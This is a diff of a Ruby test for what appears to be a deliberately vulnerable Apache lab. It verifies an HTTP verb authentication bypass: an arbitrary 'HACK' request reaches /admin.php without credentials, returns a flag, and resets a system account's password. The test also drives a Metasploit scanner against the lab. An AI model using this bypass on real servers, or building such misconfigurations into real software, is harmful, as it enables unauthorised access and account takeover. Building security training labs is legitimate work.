@@ -3,10 +3,13 @@ require 'base64'
 require 'shellwords'
 
 class ApacheVerbAuthBypassTest < PostProvisionTest
-  # The apache module serves the misconfigured vhost on port 80; not an input.
+  # The apache module serves the vhost on port 80; not an input.
   PORT = 80
-  # Directory protected with <Limit GET POST> (see manifests/config.pp).
-  PROTECTED_PATH = '/private/'.freeze
+  # The protected admin page (see manifests/config.pp + the vhost config).
+  ADMIN_PATH = '/admin.php'.freeze
+  # An arbitrary verb: not GET/POST/HEAD, so <Limit GET POST> never challenges
+  # it, and PHP still runs the page. This is the heart of the lab.
+  BYPASS_VERB = 'HACK'.freeze
 
   def initialize
     self.module_name = 'apache_verb_auth_bypass'
@@ -17,106 +20,105 @@ class ApacheVerbAuthBypassTest < PostProvisionTest
   def test_module
     super
 
-    # Inputs (see secgen_metadata.xml). All four read_facts are observable:
-    #   unix_username / used_password — the Basic Auth credentials (tier 2 below)
-    #   leaked_filenames             — the protected secret's filename
-    #   strings_to_leak              — the secret's content
-    username = self.json_inputs['unix_username']&.first.to_s
-    password = self.json_inputs['used_password']&.first.to_s
-    filename = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?).first
-    secret_line = self.json_inputs['strings_to_leak']&.first.to_s
-                      .lines.map(&:strip).reject(&:empty?).first
+    # Inputs (see secgen_metadata.xml).
+    username   = self.json_inputs['unix_username']&.first.to_s
+    password   = self.json_inputs['used_password']&.first.to_s
+    reset_user = self.json_inputs['reset_target_username']&.first.to_s
+    flag       = self.json_inputs['strings_to_leak']&.first.to_s
+                     .lines.map(&:strip).reject(&:empty?).first
 
     tier(1) do
       test_local_command('apache2 installed?', 'dpkg -l apache2 | grep -E "^ii"', 'apache2')
-      # The misconfiguration itself is on disk: <Limit GET POST> guarding the dir.
+      test_local_command('mod_php installed?', 'dpkg -l libapache2-mod-php | grep -E "^ii"', 'libapache2-mod-php')
+      # The misconfiguration itself is on disk: <Limit GET POST> round the page.
       test_local_command('<Limit GET POST> config present?',
                          "grep -rh 'Limit GET POST' /etc/apache2/ 2>/dev/null",
                          'Limit GET POST')
       test_local_command('htpasswd file present?',
                          'test -f /etc/apache2/.htpasswd && echo present', 'present')
-      if filename
-        test_local_command('protected secret file present?',
-                           "test -f /var/www/html/private/#{Shellwords.escape(filename)} && echo present",
-                           'present')
-      else
-        skip_check('protected secret file present?', 'no leaked_filenames input', tier: 1)
-      end
+      test_local_command('admin.php present?',
+                         'test -f /var/www/html/admin.php && echo present', 'present')
+      test_local_command('reset helper present?',
+                         'test -x /usr/local/bin/panel_reset && echo present', 'present')
+      test_local_command('sudoers rule present?',
+                         'test -f /etc/sudoers.d/panel_reset && echo present', 'present')
     end
 
     tier(2) do
       test_service_up(port: PORT)
 
-      # 1. A GET of the protected directory is challenged for credentials (401).
-      get = raw_http('GET', PROTECTED_PATH)
+      # 1. A GET of the admin page is challenged for credentials (401).
+      get = raw_http('GET', ADMIN_PATH)
       if get[:status] == '401' && get[:raw].include?('WWW-Authenticate')
         pass_check('GET requires auth',
-                   "GET #{PROTECTED_PATH} returned 401 with a WWW-Authenticate challenge", tier: 2)
+                   "GET #{ADMIN_PATH} returned 401 with a WWW-Authenticate challenge", tier: 2)
       else
         fail_check('GET requires auth',
-                   "GET #{PROTECTED_PATH} returned #{get[:status].inspect}, expected a 401 Basic Auth challenge",
+                   "GET #{ADMIN_PATH} returned #{get[:status].inspect}, expected a 401 Basic Auth challenge",
                    tier: 2, evidence: get[:raw][0, 400])
       end
 
-      # 2. The configured credentials unlock the protected secret — proves the
-      #    username/password inputs and the placed strings_to_leak content.
-      if !username.empty? && !password.empty? && filename && secret_line && !secret_line.empty?
-        token = Base64.strict_encode64("#{username}:#{password}")
-        authed = raw_http('GET', "/private/#{filename}", auth: token)
-        if authed[:status] == '200' && authed[:raw].include?(secret_line)
-          pass_check('valid credentials return the secret',
-                     "GET /private/#{filename} with the configured credentials returned the leaked string", tier: 2)
+      # 2. The bypass: an arbitrary verb reaches the page unauthenticated AND the
+      #    page executes, so the first flag is returned without credentials. This
+      #    is the whole point - <Limit GET POST> leaves every other verb open.
+      if flag && !flag.empty?
+        bypass = raw_http(BYPASS_VERB, ADMIN_PATH)
+        if bypass[:status] == '200' && bypass[:raw].include?(flag)
+          pass_check('verb bypass returns the admin page + flag',
+                     "#{BYPASS_VERB} #{ADMIN_PATH} returned 200 without credentials and contained the flag", tier: 2)
         else
-          fail_check('valid credentials return the secret',
-                     "GET /private/#{filename} with the configured credentials returned #{authed[:status].inspect} and did not contain the leaked string",
-                     tier: 2, evidence: authed[:raw][0, 400])
+          fail_check('verb bypass returns the admin page + flag',
+                     "#{BYPASS_VERB} #{ADMIN_PATH} returned #{bypass[:status].inspect} and did not contain the flag; the arbitrary verb may not be executing the page",
+                     tier: 2, evidence: bypass[:raw][0, 400])
         end
       else
-        skip_check('valid credentials return the secret',
-                   'missing unix_username/used_password/leaked_filenames/strings_to_leak input', tier: 2)
+        skip_check('verb bypass returns the admin page + flag', 'no strings_to_leak input', tier: 2)
       end
 
-      # 3. The misconfiguration: a verb outside <Limit GET POST> (TRACE) is served
-      #    without credentials. This is exactly what the tier-3 MSF auxiliary
-      #    (verb_auth_bypass) detects — a verb whose status differs from the GET's
-      #    401. A <LimitExcept GET POST> fix would return 401 here too.
-      trace = raw_http('TRACE', PROTECTED_PATH)
-      if trace[:status] == '200'
-        pass_check('verb bypass (TRACE) is unauthenticated',
-                   "TRACE #{PROTECTED_PATH} returned 200 without credentials — <Limit GET POST> leaves it unprotected", tier: 2)
+      # 3. The impact: the same verb bypass drives the password-reset action (PHP
+      #    reads the query string whatever the method), so an unauthenticated
+      #    request changes a system account's password.
+      if !reset_user.empty?
+        before = run_command("getent shadow #{Shellwords.escape(reset_user)}")[:stdout].to_s.strip
+        new_pw = 'Bypassed12345'
+        raw_http(BYPASS_VERB, "#{ADMIN_PATH}?action=reset&user=#{reset_user}&pw=#{new_pw}")
+        after = run_command("getent shadow #{Shellwords.escape(reset_user)}")[:stdout].to_s.strip
+        after_hash = after.split(':')[1].to_s
+        if !before.empty? && !after.empty? && before != after && after_hash.start_with?('$')
+          pass_check('unauthenticated reset changes the account password',
+                     "an unauthenticated #{BYPASS_VERB} request to the reset action changed #{reset_user}'s password hash", tier: 2)
+        else
+          fail_check('unauthenticated reset changes the account password',
+                     "#{reset_user}'s shadow entry did not change after the reset request (before==after or no account present)",
+                     tier: 2, evidence: "before: #{before.split(':').first}\nafter_hash_present: #{after_hash.start_with?('$')}")
+        end
       else
-        fail_check('verb bypass (TRACE) is unauthenticated',
-                   "TRACE #{PROTECTED_PATH} returned #{trace[:status].inspect}, expected 200 (verb auth bypass)",
-                   tier: 2, evidence: trace[:raw][0, 400])
+        skip_check('unauthenticated reset changes the account password', 'no reset_target_username input', tier: 2)
       end
     end
 
-    # Tier 3: prove the bypass with the stock MSF auxiliary scanner from the
-    # attacker VM. This is an auxiliary/scanner module proving an info leak (not
-    # a session exploit), so it is driven with run_msf_module and asserted here
-    # rather than via the deferred test_msf_exploit stub / expect_privilege path.
+    # Tier 3: prove the bypass is detectable with the stock MSF auxiliary scanner
+    # from the attacker VM. This is an auxiliary/scanner module proving the
+    # misconfiguration (not a session exploit), so it is driven with
+    # run_msf_module and asserted here rather than via test_msf_exploit.
     #
-    # The scanner (auxiliary/scanner/http/verb_auth_bypass) first does a baseline
-    # GET of TARGETURI and only continues if that GET is challenged with a
-    # WWW-Authenticate header; it then retries the path with each of
+    # The scanner baselines a GET of TARGETURI, continues only if that GET is
+    # challenged with WWW-Authenticate, then retries each of
     # ['HEAD','TRACE','TRACK','Wmap','get','trace'] and reports a bypass for any
     # verb whose status differs from the GET's and is <= 302. TARGETURI MUST be
-    # the protected directory — against the docroot it would see no challenge and
-    # report nothing (this is what the earlier empty-options generation got
-    # wrong). Of those verbs only uppercase TRACE returns 200 here: HEAD folds
-    # into GET under <Limit>, and TRACK/Wmap/lowercase verbs draw a 4xx/5xx.
+    # the protected page. With TraceEnable Off, HEAD folds into GET (401) but the
+    # arbitrary verbs (TRACK/Wmap/get/trace) execute the page and return 200.
     tier(3) do
       aux = run_msf_module('auxiliary/scanner/http/verb_auth_bypass',
-                           options: { 'TARGETURI' => PROTECTED_PATH, 'RPORT' => PORT },
+                           options: { 'TARGETURI' => ADMIN_PATH, 'RPORT' => PORT },
                            label: 'apache_verb_auth_bypass')
       next unless aux
 
       out = aux[:msf_output].to_s
-      # print_good -> "[+] ... Possible authentication bypass with verb TRACE [200]"
       if out =~ /authentication bypass with verb/i
         verb = out[/authentication bypass with verb (\S+)/i, 1]
         pass_check('verb_auth_bypass confirms the bypass',
-                   "auxiliary/scanner/http/verb_auth_bypass on #{aux[:attacker]} reported an authentication bypass (verb #{verb}) against #{aux[:rhost]}#{PROTECTED_PATH}",
+                   "auxiliary/scanner/http/verb_auth_bypass on #{aux[:attacker]} reported an authentication bypass (verb #{verb}) against #{aux[:rhost]}#{ADMIN_PATH}",
                    tier: 3)
       else
         fail_check('verb_auth_bypass confirms the bypass',
